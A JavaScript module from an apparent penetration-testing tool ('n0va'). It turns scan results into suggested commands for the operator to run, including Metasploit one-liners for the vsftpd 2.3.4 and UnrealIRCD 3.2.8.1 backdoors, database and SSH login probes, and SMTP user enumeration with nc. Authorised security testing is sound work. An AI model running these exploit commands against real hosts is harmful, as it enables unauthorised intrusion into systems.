// PoC command suggestions — the Kali-style "what do I run next" layer.
// n0va surfaces findings; the OPERATOR decides and runs (console or copy-paste).
// We never auto-exploit: just hand over the exact command.
import { execSync } from 'child_process';

function hostOf(t) {
  return t?.details?.hostname || t?.input || 'TARGET';
}
function urlOf(t) {
  const proto = t?.details?.protocol || 'http:';
  return `${proto}//${hostOf(t)}`;
}

// Is a CLI tool present on THIS host? (n0va can only run what's installed)
function isInstalled(name) {
  try {
    execSync(`which ${name} 2>/dev/null`, { stdio: 'pipe' });
    return true;
  } catch {
    return false;
  }
}

// Keyword → PoC generator. version is matched so we only pounce on the
// exact vulnerable builds (vsftpd 2.3.4, UnrealIRCD 3.2.8.1, ...).
// `requires` = the binary the operator must have installed to run the command.
const SERVICE_POC = {
  vsftpd: {
    match: (v) => /2\.3\.4/.test(v || ''),
    requires: 'msfconsole',
    label: 'vsftpd 2.3.4 backdoor RCE (CVE-2011-2523)',
    risk: 'aggressive',
    cmd: (t) => `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS ${hostOf(t)}; run"`,
  },
  unrealircd: {
    match: (v) => /3\.2\.8\.1/.test(v || ''),
    requires: 'msfconsole',
    label: 'UnrealIRCD 3.2.8.1 backdoor RCE (CVE-2010-2075)',
    risk: 'aggressive',
    cmd: (t) => `msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS ${hostOf(t)}; run"`,
  },
  mysql: {
    match: () => true,
    requires: 'mysql',
    label: 'MySQL — anonymous / weak-cred login check',
    risk: 'active',
    cmd: (t) => `mysql -h ${hostOf(t)} -u root -p`,
  },
  postgresql: {
    match: () => true,
    requires: 'psql',
    label: 'PostgreSQL — connect to test auth',
    risk: 'active',
    cmd: (t) => `psql -h ${hostOf(t)} -U postgres`,
  },
  redis: {
    match: () => true,
    requires: 'redis-cli',
    label: 'Redis — unauthenticated access check',
    risk: 'active',
    cmd: (t) => `redis-cli -h ${hostOf(t)}`,
  },
  ftp: {
    match: () => true,
    requires: 'ftp',
    label: 'FTP — anonymous login attempt',
    risk: 'active',
    cmd: (t) => `ftp ${hostOf(t)}`,
  },
  ssh: {
    match: () => true,
    requires: 'ssh',
    label: 'SSH — connect / brute-force entry',
    risk: 'active',
    cmd: (t) => `ssh ${hostOf(t)}`,
  },
  smtp: {
    match: () => true,
    requires: 'nc',
    label: 'SMTP — enumerate users (VRFY/EXPN)',
    risk: 'active',
    cmd: (t) => `nc -nv ${hostOf(t)} 25 <<< "VRFY root"`,
  },
};

export function suggestCommands(finding, target) {
  const out = [];
  const service = (finding.service || finding.name || '').toLowerCase();
  const version = finding.version || '';
  // nmap reports "ftp" + version "vsftpd 2.3.4" — match the combined string
  // so the vulnerable build is caught even when the service label is generic.
  const hay = `${service} ${version}`.toLowerCase();

  for (const [key, def] of Object.entries(SERVICE_POC)) {
    if (hay.includes(key) && def.match(version)) {
      const entry = { label: def.label, cmd: def.cmd(target), risk: def.risk, ref: key };
      const tool = def.requires;
      if (tool && !isInstalled(tool)) {
        entry.unavailable = true;
        entry.note = `Tool '${tool}' is not installed on this host. Install it to run this:\n  sudo apt install ${tool === 'psql' ? 'postgresql-client' : tool === 'redis-cli' ? 'redis-tools' : tool === 'nc' ? 'netcat-openbsd' : tool}`;
      }
      out.push(entry);
    }
  }

  if (finding.path) {
    out.push({
      label: `Fetch discovered path ${finding.path}`,
      cmd: `curl -sk -i ${urlOf(target)}${finding.path}`,
      risk: 'active',
    });
  }

  if (finding.template) {
    out.push({
      label: `Re-test ${finding.template} (${finding.severity})`,
      cmd: `curl -sk -i "${finding.matched || urlOf(target)}"`,
      risk: 'active',
    });
  }

  return out;
}

// Walk an Analyze result and produce grouped PoC suggestions.
export function suggestFromTarget(target) {
  const groups = [];

  for (const s of target?.intelligence?.serviceVersions || []) {
    const cmds = suggestCommands({ port: s.port, service: s.service, version: s.version }, target);
    if (cmds.length) groups.push({ source: `port ${s.port}/${s.service}`, finding: s, commands: cmds });
  }

  for (const p of (target?.intelligence?.discoveredPaths || []).slice(0, 10)) {
    const cmds = suggestCommands({ path: p.path, status: p.status }, target);
    if (cmds.length) groups.push({ source: `path ${p.path}`, finding: p, commands: cmds });
  }

  for (const n of (target?.intelligence?.nucleiFindings || []).slice(0, 10)) {
    const cmds = suggestCommands({ template: n.template, severity: n.severity, matched: n.matched }, target);
    if (cmds.length) groups.push({ source: `nuclei ${n.template}`, finding: n, commands: cmds });
  }

  return groups;
}
